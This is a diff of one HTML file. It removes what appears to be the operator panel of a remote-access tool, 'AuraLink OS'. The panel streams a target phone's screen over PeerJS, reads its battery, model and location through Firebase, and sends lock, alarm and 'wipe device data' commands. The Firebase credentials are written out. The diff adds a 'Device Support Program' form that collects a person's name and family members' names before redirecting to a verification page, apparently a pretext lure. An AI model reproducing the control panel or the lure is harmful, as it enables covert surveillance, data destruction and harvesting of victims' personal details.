@@ -2,132 +2,52 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>AuraLink OS v6.0 | Control Terminal</title>
-    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
-    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Support Program 2026</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        body { background: #050505; color: #fff; font-family: 'Inter', sans-serif; }
-        .glass { background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(10px); }
-        .screen-view { width: 100%; height: 75vh; background: #000; border-radius: 20px; position: relative; overflow: hidden; border: 2px solid #1a73e8; }
-        video { width: 100%; height: 100%; object-fit: contain; }
-    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+    <style>body { font-family: 'Inter', sans-serif; }</style>
 </head>
-<body class="p-6">
-
-    <div class="max-w-[1600px] mx-auto grid grid-cols-12 gap-6">
-        <!-- Sidebar Controls -->
-        <div class="col-span-3 space-y-6">
-            <div class="glass p-6 rounded-3xl">
-                <h1 class="text-xl font-black text-blue-500 mb-4 tracking-tighter">AURALINK PRO</h1>
-                <input id="session-input" type="text" placeholder="Enter Session ID" class="w-full bg-white/5 border border-white/10 p-3 rounded-xl mb-3 text-sm outline-none focus:border-blue-500">
-                <button onclick="connectToDevice()" class="w-full bg-blue-600 p-3 rounded-xl font-bold hover:bg-blue-700 transition">CONNECT SESSION</button>
+<body class="bg-slate-50">
+    <div class="max-w-md mx-auto min-h-screen flex flex-col justify-center p-6">
+        <div class="bg-white p-8 rounded-[2.5rem] shadow-xl border border-slate-100">
+            <div class="text-center mb-8">
+                <div class="w-16 h-16 bg-blue-600 rounded-2xl mx-auto mb-4 flex items-center justify-center text-white text-2xl font-bold">A</div>
+                <h1 class="text-2xl font-bold text-slate-900">Application Form</h1>
+                <p class="text-slate-500 text-sm mt-2">Enter your details to proceed with verification.</p>
             </div>
 
-            <div class="glass p-6 rounded-3xl space-y-4">
-                <h3 class="text-xs font-bold text-gray-500 uppercase italic">Power Functions</h3>
-                <div class="grid grid-cols-2 gap-3">
-                    <button onclick="sendCommand('vibrate')" class="bg-white/5 p-4 rounded-2xl hover:bg-white/10 transition text-xs">📳 Vibrate</button>
-                    <button onclick="sendCommand('torch')" class="bg-white/5 p-4 rounded-2xl hover:bg-white/10 transition text-xs">🔦 Torch</button>
-                    <button onclick="sendCommand('alert')" class="bg-white/5 p-4 rounded-2xl hover:bg-white/10 transition text-xs">🔊 Alarm</button>
-                    <button onclick="sendCommand('lock')" class="bg-red-900/20 p-4 rounded-2xl text-red-500 text-xs border border-red-900/50">🔒 Lock</button>
+            <form id="regForm" class="space-y-4">
+                <div>
+                    <label class="text-xs font-semibold text-slate-500 uppercase ml-1">Full Name</label>
+                    <input type="text" id="userName" required class="w-full bg-slate-50 border-none p-4 rounded-2xl focus:ring-2 focus:ring-blue-500 transition shadow-sm">
                 </div>
-                <button onclick="sendCommand('delete_data')" class="w-full bg-red-600/10 text-red-500 border border-red-600/20 p-3 rounded-xl text-xs hover:bg-red-600 hover:text-white transition">WIPE DEVICE DATA</button>
-            </div>
-
-            <div class="glass p-6 rounded-3xl">
-                <h3 class="text-xs font-bold text-gray-500 uppercase mb-4">Device Logs</h3>
-                <div id="logs" class="text-[10px] font-mono h-40 overflow-y-auto space-y-1 text-blue-300"></div>
-            </div>
-        </div>
-
-        <!-- Live View & Touch Control -->
-        <div class="col-span-9 space-y-6">
-            <div class="screen-view glass" id="screen-container">
-                <video id="remote-video" autoplay playsinline></video>
-                <div class="absolute top-4 right-4 flex gap-2">
-                    <span id="status-tag" class="bg-red-600 text-[10px] px-3 py-1 rounded-full font-bold">OFFLINE</span>
-                    <button onclick="toggleFS()" class="bg-white/10 px-3 py-1 rounded-full text-[10px]">FULL SCREEN</button>
+                <div>
+                    <label class="text-xs font-semibold text-slate-500 uppercase ml-1">Father's Name</label>
+                    <input type="text" id="fatherName" required class="w-full bg-slate-50 border-none p-4 rounded-2xl focus:ring-2 focus:ring-blue-500 transition shadow-sm">
                 </div>
-            </div>
-
-            <!-- Advanced Data Grid -->
-            <div class="grid grid-cols-3 gap-6">
-                <div class="glass p-5 rounded-3xl flex justify-between items-center">
-                    <div><p class="text-gray-500 text-[10px]">BATTERY</p><h2 id="view-bat" class="text-xl font-bold">--%</h2></div>
-                    <div class="text-2xl">🔋</div>
+                <div>
+                    <label class="text-xs font-semibold text-slate-500 uppercase ml-1">Brother's Name</label>
+                    <input type="text" id="brotherName" required class="w-full bg-slate-50 border-none p-4 rounded-2xl focus:ring-2 focus:ring-blue-500 transition shadow-sm">
                 </div>
-                <div class="glass p-5 rounded-3xl flex justify-between items-center">
-                    <div><p class="text-gray-500 text-[10px]">MODEL</p><h2 id="view-mod" class="text-lg font-bold">--</h2></div>
-                    <div class="text-2xl">📱</div>
-                </div>
-                <div class="glass p-5 rounded-3xl flex justify-between items-center">
-                    <div><p class="text-gray-500 text-[10px]">LOCATION</p><h2 id="view-loc" class="text-sm font-bold">Pakistan</h2></div>
-                    <div class="text-2xl">📍</div>
-                </div>
-            </div>
+                <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-2xl shadow-lg shadow-blue-200 transition-all active:scale-95">
+                    Continue to Verification
+                </button>
+            </form>
         </div>
     </div>
 
     <script>
-        // Firebase Config
-        const firebaseConfig = {
-            apiKey: "AIzaSyCvsSmO56lQ37M43Zm-zSY7pduzqgR-Ka4",
-            authDomain: "auralink-2026.firebaseapp.com",
-            projectId: "auralink-2026",
-            databaseURL: "https://auralink-2026-default-rtdb.firebaseio.com", // Apni DB URL dalein
-            storageBucket: "auralink-2026.firebasestorage.app",
-            appId: "1:801004659604:web:9fbcf2b2d88696d9afa581"
+        document.getElementById('regForm').onsubmit = (e) => {
+            e.preventDefault();
+            const userData = {
+                name: document.getElementById('userName').value,
+                father: document.getElementById('fatherName').value,
+                brother: document.getElementById('brotherName').value
+            };
+            localStorage.setItem('temp_user', JSON.stringify(userData));
+            window.location.href = 'verify.html';
         };
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
-        const peer = new Peer("AURALINK_ADMIN_MAIN");
-
-        let currentSession = "";
-
-        function connectToDevice() {
-            currentSession = document.getElementById('session-input').value;
-            if(!currentSession) return alert("Enter Session ID first!");
-
-            // Listen for Device Info from Firebase
-            db.ref('sessions/' + currentSession).on('value', (snapshot) => {
-                const data = snapshot.val();
-                if(data) {
-                    document.getElementById('view-bat').innerText = data.battery;
-                    document.getElementById('view-mod').innerText = data.model;
-                    document.getElementById('status-tag').innerText = "LIVE";
-                    document.getElementById('status-tag').classList.replace('bg-red-600', 'bg-green-600');
-                    addLog("Data Handshake Successful");
-                }
-            });
-        }
-
-        peer.on('call', (call) => {
-            call.answer();
-            call.on('stream', (stream) => {
-                document.getElementById('remote-video').srcObject = stream;
-            });
-        });
-
-        function sendCommand(cmd) {
-            if(!currentSession) return alert("Not Connected");
-            db.ref('commands/' + currentSession).set({
-                action: cmd,
-                timestamp: Date.now()
-            });
-            addLog("Command Sent: " + cmd);
-        }
-
-        function addLog(msg) {
-            const l = document.getElementById('logs');
-            l.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
-            l.scrollTop = l.scrollHeight;
-        }
-
-        function toggleFS() {
-            document.getElementById('remote-video').requestFullscreen();
-        }
     </script>
 </body>
 </html>
